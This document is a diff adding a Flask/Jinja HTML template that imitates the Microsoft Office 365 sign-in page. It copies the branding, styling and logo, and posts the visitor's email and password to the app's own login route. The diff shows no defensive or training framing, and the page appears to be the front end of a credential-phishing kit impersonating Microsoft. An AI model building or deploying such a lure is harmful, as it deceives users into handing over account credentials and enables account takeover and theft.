@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Office 365 - Sign In</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f3f2f1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .signin-container {
+            background: white;
+            border-radius: 2px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            width: 440px;
+            padding: 44px;
+        }
+        .logo {
+            text-align: left;
+            margin-bottom: 24px;
+        }
+        .logo img {
+            width: 108px;
+            height: 24px;
+        }
+        h1 {
+            color: #1b1b1b;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+        .subtitle {
+            color: #605e5c;
+            font-size: 15px;
+            margin-bottom: 32px;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 11px 12px;
+            border: 1px solid #605e5c;
+            font-size: 15px;
+            outline: none;
+        }
+        input[type="email"]:focus, input[type="password"]:focus {
+            border: 1px solid #0078d4;
+        }
+        .btn-primary {
+            background: #0078d4;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            font-size: 15px;
+            cursor: pointer;
+            margin-top: 24px;
+        }
+        .btn-primary:hover {
+            background: #106ebe;
+        }
+        .error-message {
+            color: #a4262c;
+            font-size: 13px;
+            margin-top: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="signin-container">
+        <div class="logo">
+            <svg width="108" height="24" viewBox="0 0 108 24" fill="none">
+                <path d="M44.836 4.6v13.8h-2.4V7.584L38.54 18.4h-1.584L33.06 7.584V18.4h-2.4V4.6h2.928l4.536 12.048L42.66 4.6h2.176zm8.064 0c2.88 0 4.92 1.416 4.92 4.008 0 1.464-.768 2.832-2.208 3.432 1.728.504 2.832 1.968 2.832 3.912 0 2.88-2.256 4.448-5.328 4.448h-4.992V4.6h4.776zm-.312 6.24c1.536 0 2.496-.744 2.496-2.016 0-1.296-.96-2.04-2.496-2.04h-2.16v4.056h2.16zm.48 6.24c1.68 0 2.64-.792 2.64-2.184s-.96-2.232-2.64-2.232h-2.64v4.416h2.64z" fill="#5f5f5f"/>
+            </svg>
+        </div>
+        <h1>Sign in</h1>
+        <div class="subtitle">to continue to Microsoft Office</div>
+        
+        <form action="{{ url_for('login') }}" method="POST">
+            <div class="form-group">
+                <input type="email" name="email" placeholder="Email, phone, or Skype" required>
+            </div>
+            <div class="form-group">
+                <input type="password" name="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="btn-primary">Sign in</button>
+        </form>
+    </div>
+</body>
+</html>
